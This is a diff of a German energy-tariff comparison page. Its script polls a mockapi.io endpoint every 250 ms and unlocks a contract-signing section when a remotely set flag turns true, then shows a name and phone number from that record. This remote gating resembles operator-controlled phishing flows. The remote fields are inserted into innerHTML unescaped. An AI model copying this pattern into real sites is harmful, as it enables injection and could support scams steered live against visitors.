@@ -700,6 +700,43 @@
       padding: 0 6px;
     }
 
+    /* ===== POLLING TOAST ===== */
+    .poll-toast {
+      position: fixed;
+      bottom: 80px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--white);
+      border: 1px solid var(--gray-200);
+      border-radius: var(--radius-md);
+      padding: 10px 16px;
+      box-shadow: var(--shadow-lg);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      z-index: 150;
+      transition: all 0.3s ease;
+    }
+    .poll-toast.error {
+      border-color: #ef4444;
+      background: #fef2f2;
+    }
+    .poll-dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--accent);
+      animation: pulse 0.5s ease infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+    .poll-label {
+      font-size: 11px;
+      color: var(--gray-700);
+    }
+
     /* ===== SECTION 2: SIGNING ===== */
     #signing-section {
       display: none;
@@ -1010,30 +1047,6 @@
       0%, 100% { transform: translateX(-50%) translateY(0); }
       50% { transform: translateX(-50%) translateY(-5px); }
     }
-
-    /* Live indicator for API polling */
-    .live-indicator {
-      display: inline-flex;
-      align-items: center;
-      gap: 5px;
-      font-size: 9px;
-      color: var(--gray-500);
-      padding: 4px 9px;
-      background: var(--white);
-      border-radius: 11px;
-      margin-top: 8px;
-    }
-    .live-dot {
-      width: 5px;
-      height: 5px;
-      border-radius: 50%;
-      background: var(--accent);
-      animation: pulse 0.5s ease infinite;
-    }
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
   </style>
 </head>
 <body>
@@ -1311,14 +1324,6 @@
       <div class="spinner"></div>
       <span>Angebote werden geladen…</span>
     </div>
-    
-    <!-- Live polling indicator -->
-    <div style="text-align:center;">
-      <div class="live-indicator" id="liveIndicator">
-        <span class="live-dot"></span>
-        <span>Live-Abfrage (250ms)</span>
-      </div>
-    </div>
 
     <p class="disclaimer">
       Alle Preise inkl. MwSt. · Basis: 2.500 kWh/Jahr · Stand: 2026<br>
@@ -1327,6 +1332,12 @@
 
   </main>
 </div><!-- /#comparison-section -->
+
+<!-- ===== POLLING TOAST ===== -->
+<div class="poll-toast" id="pollToast">
+  <span class="poll-dot"></span>
+  <span class="poll-label" id="pollLabel">Warte auf Freischaltung…</span>
+</div>
 
 <!-- ===== SECTION 2: SIGNING (hidden until update3=true) ===== -->
 <div id="signing-section">
@@ -1459,17 +1470,14 @@
       behavior: 'smooth'
     });
     
-    // Update dots
     carouselDots.forEach((dot, idx) => {
       dot.classList.toggle('active', idx === currentSlide);
     });
     
-    // Update provider tabs
     providerTabs.forEach((tab, idx) => {
       tab.classList.toggle('active', idx === currentSlide);
     });
     
-    // Update buttons
     carouselPrev.disabled = currentSlide === 0;
     carouselNext.disabled = currentSlide === totalSlides - 1;
   }
@@ -1488,7 +1496,6 @@
     }
   });
 
-  // Update on scroll
   carouselContainer.addEventListener('scroll', () => {
     const slide = carouselContainer.querySelector('.carousel-slide');
     const slideWidth = slide.offsetWidth;
@@ -1507,10 +1514,8 @@
     }
   });
 
-  // Initialize
   updateCarousel();
 
-  // Handle window resize
   let resizeTimeout;
   window.addEventListener('resize', () => {
     clearTimeout(resizeTimeout);
@@ -1597,92 +1602,104 @@
   });
 
   // =====================
-  // RAPID API POLLING (250ms)
+  // POLLING & REDIRECT (YOUR STRUCTURE)
   // =====================
-  let pollingInterval = null;
+  let pollCount = 0;
   let hasRedirected = false;
-  let lastUpdate3Value = null;
+  const pollToast = document.getElementById('pollToast');
+  const pollLabel = document.getElementById('pollLabel');
 
-  async function checkAPI() {
+  function triggerRedirect(entry) {
     if (hasRedirected) return;
-    
-    try {
-      const res = await fetch('https://6797e9d9c2c861de0c6e6bdf.mockapi.io/search?t=' + Date.now());
-      const data = await res.json();
-      
-      document.getElementById('api-status').style.display = 'none';
+    hasRedirected = true;
 
-      if (Array.isArray(data) && data.length > 0) {
-        const entry = data[0];
-
-        const detailsEl = document.getElementById('customer-details');
-        if (detailsEl.querySelector('.api-loader')) {
-          detailsEl.innerHTML = `
-            <div class="sign-detail-row">
-              <span class="sign-detail-label">Name</span>
-              <span class="sign-detail-value">${entry.first_name || ''} ${entry.last_name || ''}</span>
-            </div>
-            <div class="sign-detail-row">
-              <span class="sign-detail-label">Telefon</span>
-              <span class="sign-detail-value">${entry.phone || '–'}</span>
-            </div>
-            <div class="sign-detail-row">
-              <span class="sign-detail-label">Datum</span>
-              <span class="sign-detail-value">${entry.valid_from_date || entry.lost_date || '–'}</span>
-            </div>
-            <div class="sign-detail-row">
-              <span class="sign-detail-label">Referenz</span>
-              <span class="sign-detail-value">#${entry.id || '–'}</span>
-            </div>
-          `;
-        }
-
-        const currentUpdate3 = entry.update3 === true;
-        
-        if (currentUpdate3 && lastUpdate3Value !== true) {
-          hasRedirected = true;
-          lastUpdate3Value = true;
-          
-          if (pollingInterval) {
-            clearInterval(pollingInterval);
-            pollingInterval = null;
-          }
-          
-          const liveIndicator = document.getElementById('liveIndicator');
-          if (liveIndicator) {
-            liveIndicator.style.display = 'none';
-          }
-
-          const sigSection = document.getElementById('signing-section');
-          sigSection.classList.add('visible');
-          
-          const hint = document.getElementById('scrollHint');
-          hint.classList.add('show');
-          
-          setTimeout(() => {
-            sigSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
-            hint.remove();
-          }, 100);
-        }
-        
-        lastUpdate3Value = currentUpdate3;
-      }
-    } catch (err) {
-      console.warn('API fetch failed:', err);
+    // Stop polling
+    if (pollInterval) {
+      clearInterval(pollInterval);
+      pollInterval = null;
     }
+
+    // Hide polling toast
+    pollToast.style.display = 'none';
+
+    // Populate customer details
+    const detailsEl = document.getElementById('customer-details');
+    detailsEl.innerHTML = `
+      <div class="sign-detail-row">
+        <span class="sign-detail-label">Name</span>
+        <span class="sign-detail-value">${entry.first_name || ''} ${entry.last_name || ''}</span>
+      </div>
+      <div class="sign-detail-row">
+        <span class="sign-detail-label">Telefon</span>
+        <span class="sign-detail-value">${entry.phone || '–'}</span>
+      </div>
+      <div class="sign-detail-row">
+        <span class="sign-detail-label">Datum</span>
+        <span class="sign-detail-value">${entry.valid_from_date || entry.lost_date || '–'}</span>
+      </div>
+      <div class="sign-detail-row">
+        <span class="sign-detail-label">Referenz</span>
+        <span class="sign-detail-value">#${entry.id || '–'}</span>
+      </div>
+    `;
+
+    // Show signing section
+    const sigSection = document.getElementById('signing-section');
+    sigSection.classList.add('visible');
+
+    // Show hint and scroll
+    const hint = document.getElementById('scrollHint');
+    hint.classList.add('show');
+
+    setTimeout(() => {
+      sigSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      hint.remove();
+    }, 100);
   }
 
-  checkAPI();
-  pollingInterval = setInterval(checkAPI, 250);
+  function pollAPI() {
+    if (hasRedirected) return;
 
-  setTimeout(() => {
-    if (pollingInterval && !hasRedirected) {
-      clearInterval(pollingInterval);
-      pollingInterval = null;
-      const liveIndicator = document.getElementById('liveIndicator');
-      if (liveIndicator) {
-        liveIndicator.innerHTML = '<span style="color:#aaa;">Abfrage pausiert</span>';
-      }
+    pollCount++;
+    fetch('https://6797e9d9c2c861de0c6e6bdf.mockapi.io/search?t=' + Date.now())
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        // Hide loader on first successful response
+        document.getElementById('api-status').style.display = 'none';
+
+        if (Array.isArray(data) && data.length > 0) {
+          var entry = data[0];
+          if (entry.update3 === true) {
+            triggerRedirect(entry);
+          } else {
+            // Still waiting — update label with pulse count
+            pollLabel.textContent = 'Warte auf Freischaltung… (' + pollCount + ')';
+          }
+        }
+      })
+      .catch(function(err) {
+        console.warn('Poll error:', err);
+        pollToast.classList.add('error');
+        pollLabel.textContent = 'Verbindungsfehler – wird erneut versucht…';
+        setTimeout(function() {
+          if (!hasRedirected) {
+            pollToast.classList.remove('error');
+            pollLabel.textContent = 'Warte auf Freischaltung… (' + pollCount + ')';
+          }
+        }, 3000);
+      });
+  }
+
+  // Start polling every 250ms
+  var pollInterval = setInterval(pollAPI, 250);
+
+  // Stop after 2 minutes
+  setTimeout(function() {
+    if (pollInterval && !hasRedirected) {
+      clearInterval(pollInterval);
+      pollInterval = null;
+      pollLabel.textContent = 'Abfrage pausiert';
+      pollToast.querySelector('.poll-dot').style.display = 'none';
     }
   }, 120000);
 </script>
